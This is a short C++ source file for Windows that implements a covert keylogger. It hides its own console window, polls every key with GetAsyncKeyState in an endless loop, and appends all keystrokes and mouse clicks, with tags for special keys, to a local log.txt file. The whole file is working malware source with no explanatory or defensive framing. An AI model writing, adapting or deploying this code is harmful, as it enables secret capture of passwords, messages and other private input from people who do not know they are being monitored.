#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

void log(string input) {
	fstream logFile;
	logFile.open("log.txt", fstream::app);
	if (logFile.is_open()) {
		logFile << input;
		logFile.close();
	}
}

bool SpecialKeys(int key) {
	switch (key) {
	case VK_LBUTTON:
		log("[LCLICK]");
		return true;
	case VK_RBUTTON:
		log("[RCLICK]");
		return true;	
	case VK_SPACE:
		log(" ");
		return true;
	case VK_RETURN:
		log("\n");
		return true;
	case VK_BACK:
		log("\b");
		return true;
	case VK_CAPITAL:
		log("[CAPS]");
		return true;
	case VK_TAB:
		log("[TAB]");
		return true;
	case VK_UP:
		log("[UP]");
		return true;
	case VK_DOWN:
		log("[DOWN]");
		return true;
	case VK_LEFT:
		log("[LEFT]");
		return true;
	case VK_RIGHT:
		log("[RIGHT]");
		return true;
	case VK_CONTROL:
		log("[CTRL]");
		return true;
	case VK_MENU:
		log("[ALT]");
		return true;
	case VK_ESCAPE:
		log("[ESC]");
		return true;
	default:
		return false;
	}
}

int main(){
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char a;
	while (true) {
		Sleep(10);
		for (int a = 0; a <= 255; a++){
			if (GetAsyncKeyState(a) == -32767) {
				if (SpecialKeys(a) == false) {

					fstream LogFile;
					LogFile.open("log.txt", fstream::app);
					if (LogFile.is_open()) {
						if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
							LogFile << char(a);
							cout << char(a) << endl;
							LogFile.close();
						}
						else {
							LogFile << char(tolower(a));
							cout << char(a) << endl;
							LogFile.close();
						}
					}
				}
			}
		}
	}
	return 0;
}
